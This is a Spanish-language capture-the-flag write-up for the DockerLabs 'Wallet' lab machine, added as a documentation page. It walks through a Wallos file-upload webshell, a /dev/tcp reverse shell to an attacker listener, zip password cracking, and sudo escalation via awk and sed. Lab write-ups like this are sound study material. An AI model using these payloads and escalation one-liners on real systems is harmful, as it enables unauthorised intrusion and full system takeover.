@@ -1,0 +1,235 @@
+---
+title: Wallet
+description: Resolución completa de la máquina virtual *Wallet* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Wallet**, desarrollada por *Pylon & El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con una aplicación Wallos vulnerable a **carga arbitraria de archivos**. Tras identificar la versión del software y un exploit público, se sube una webshell y se obtiene ejecución remota de comandos como `www-data`.
+Una vez dentro, se encadenan múltiples configuraciones inseguras de `sudo`: `www-data` puede ejecutar `awk` como `pylon`, `pylon` extrae credenciales de un ZIP protegido para acceder a `pinguino`, y finalmente `pinguino` puede ejecutar `sed` como root, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Wallet',
+    Autor: 'Pylon & El Pingüino de Mario',
+    Dificultad: 'Media',
+    Fecha: '12/07/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Wallet.zip
+sudo bash auto_deploy.sh Wallet.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Wallet/{content,exploits,nmap,scripts}
+cd Wallet
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1770188453/Ports_xruocj.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se identifica el dominio `panel.wallet.dl`. Se agrega al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 panel.wallet.dl" | sudo tee -a /etc/hosts
+```
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://panel.wallet.dl \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js -t 100 -C 404
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1770188453/Feroxbuster_npcxcm.png)
+
+**Rutas relevantes:**
+- `/login.php` — Formulario de autenticación.
+- `/about.php` — Contiene la versión de Wallos.
+  ![About](https://res.cloudinary.com/dewqswzke/image/upload/v1770188452/About_k8pnel.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Vulnerabilidad en Wallos
+
+Se busca el exploit en `searchsploit`:
+
+![Searchsploit](https://res.cloudinary.com/dewqswzke/image/upload/v1770188453/Searchsploit_cgsnp0.png)
+
+Se crea una cuenta, se añade una suscripción y se sube una webshell manipulando el `Content-Type`:
+
+```
+Content-Type: image/jpeg
+GIF89a;
+```
+
+La webshell queda en:
+
+```
+http://panel.wallet.dl/images/uploads/logos/
+```
+
+![Upload](https://res.cloudinary.com/dewqswzke/image/upload/v1770188454/Upload_roulju.png)
+
+### 2.2 Reverse shell
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta el payload:
+
+```bash
+bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1770188453/ReverseShell_dnitw7.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → pylon
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1770188454/sudo-lWWW-data_phmzyd.png)
+
+```bash
+sudo -u pylon awk 'BEGIN {system("/bin/bash")}'
+```
+
+![Pylon](https://res.cloudinary.com/dewqswzke/image/upload/v1770188453/Pylon_vpkvil.png)
+
+### 3.2 De pylon → pinguino
+
+Se encuentra `secretitotraviesito.zip`. Se crackea con John the Ripper:
+
+```bash
+zip2john secretitotraviesito.zip > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+![John](https://res.cloudinary.com/dewqswzke/image/upload/v1770188452/John_ipxpgd.png)
+
+Se extrae `notitachingona.txt` con las credenciales de `pinguino`:
+
+```bash
+su pinguino
+```
+
+![Pinguino](https://res.cloudinary.com/dewqswzke/image/upload/v1770188452/Pinguino_kfvd0s.png)
+
+### 3.3 De pinguino → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1770188453/Sudo-lPinguino_wsp0od.png)
+
+```bash
+sudo sed -n '1e exec bash 1>&0' /etc/hosts
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1770188452/Root_wj9k5u.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Carga arbitraria de archivos en Wallos",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos"
+    },
+    {
+      vulnerability: "Exposición de versión del software",
+      severity: "Media",
+      impact: "Explotación dirigida"
+    },
+    {
+      vulnerability: "Configuraciones inseguras de sudo",
+      severity: "Crítica",
+      impact: "Escalada de privilegios"
+    },
+    {
+      vulnerability: "Almacenamiento inseguro de credenciales",
+      severity: "Alta",
+      impact: "Compromiso de múltiples usuarios"
+    }
+  ]}
+/>
